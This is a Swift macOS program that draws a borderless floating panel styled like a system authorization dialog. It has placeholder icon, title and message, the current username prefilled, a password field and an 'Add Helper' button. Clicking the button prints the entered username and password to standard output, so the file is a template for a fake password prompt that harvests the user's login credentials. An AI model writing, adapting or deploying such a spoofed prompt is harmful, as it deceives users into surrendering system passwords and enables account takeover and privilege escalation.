import Cocoa

class KeyPanel: NSPanel {
    override var canBecomeKey: Bool { return true }
    override var canBecomeMain: Bool { return true }
    override var acceptsFirstResponder: Bool { return true }
}

let app = NSApplication.shared
app.setActivationPolicy(.regular)
app.finishLaunching()

let panel = KeyPanel(
    contentRect: NSRect(x: 0, y: 0, width: 270, height: 310),
    styleMask: [.borderless, .nonactivatingPanel],
    backing: .buffered,
    defer: false
)
panel.center()
panel.isOpaque = false
panel.backgroundColor = .clear
panel.level = .floating

let bg = NSVisualEffectView(frame: NSRect(x: 0, y: 0, width: 270, height: 310))
bg.material = .hudWindow
bg.blendingMode = .behindWindow
bg.state = .active
bg.wantsLayer = true
bg.layer?.cornerRadius = 14
bg.layer?.masksToBounds = true
panel.contentView = bg

let iconBase64 = "ICON_PLACEHOLDER"
let iconData = Data(base64Encoded: iconBase64, options: .ignoreUnknownCharacters)!
let iconView = NSImageView(frame: NSRect(x: 103, y: 228, width: 64, height: 64))
iconView.image = NSImage(data: iconData)
iconView.imageScaling = .scaleProportionallyUpOrDown
bg.addSubview(iconView)

let appName = NSTextField(frame: NSRect(x: 0, y: 204, width: 270, height: 22))
appName.stringValue = "TITLE_PLACEHOLDER"
appName.isEditable = false
appName.isBordered = false
appName.drawsBackground = false
appName.textColor = .white
appName.alignment = .center
appName.font = NSFont.boldSystemFont(ofSize: 17)
bg.addSubview(appName)

let body = NSTextField(frame: NSRect(x: 16, y: 116, width: 238, height: 82))
body.stringValue = "MESSAGE_PLACEHOLDER"
body.isEditable = false
body.isBordered = false
body.drawsBackground = false
body.textColor = NSColor(white: 0.85, alpha: 1.0)
body.alignment = .left
body.font = NSFont.systemFont(ofSize: 13)
body.cell?.wraps = true
body.cell?.isScrollable = false
bg.addSubview(body)

let usernameField = NSTextField(frame: NSRect(x: 16, y: 86, width: 238, height: 24))
usernameField.stringValue = NSUserName()
usernameField.isEditable = false
usernameField.bezelStyle = .roundedBezel
usernameField.font = NSFont.systemFont(ofSize: 13)
bg.addSubview(usernameField)

let passwordField = NSSecureTextField(frame: NSRect(x: 16, y: 56, width: 238, height: 24))
passwordField.placeholderString = "Password"
passwordField.bezelStyle = .roundedBezel
passwordField.font = NSFont.systemFont(ofSize: 13)
bg.addSubview(passwordField)

// --- Cancel button ---
let cancelButton = NSButton(frame: NSRect(x: 16, y: 16, width: 115, height: 28))
cancelButton.title = "Cancel"
cancelButton.bezelStyle = .rounded
cancelButton.font = NSFont.systemFont(ofSize: 13)
cancelButton.keyEquivalent = "\u{1b}"
cancelButton.target = NSApp
cancelButton.action = #selector(NSApp.terminate(_:))
bg.addSubview(cancelButton)

// --- Add Helper button ---
let okButton = NSButton(frame: NSRect(x: 139, y: 16, width: 115, height: 28))
okButton.bezelStyle = .rounded
okButton.bezelColor = NSColor.controlAccentColor
okButton.attributedTitle = NSAttributedString(string: "Add Helper", attributes: [
    .foregroundColor: NSColor.white,
    .font: NSFont.boldSystemFont(ofSize: 13)
])
okButton.keyEquivalent = "\r"
bg.addSubview(okButton)

class Handler: NSObject {
    let panel: NSPanel
    let usernameField: NSTextField
    let passwordField: NSSecureTextField
    init(panel: NSPanel, usernameField: NSTextField, passwordField: NSSecureTextField) {
        self.panel = panel
        self.usernameField = usernameField
        self.passwordField = passwordField
    }
    @objc func okClicked(_ sender: Any) {
        print("username=\(self.usernameField.stringValue)")
        print("password=\(self.passwordField.stringValue)")
        NSApp.terminate(nil)
    }
}

let handler = Handler(panel: panel, usernameField: usernameField, passwordField: passwordField)
okButton.target = handler
okButton.action = #selector(Handler.okClicked(_:))

panel.makeKeyAndOrderFront(nil)
app.activate(ignoringOtherApps: true)
panel.makeFirstResponder(passwordField)

NSApp.run()
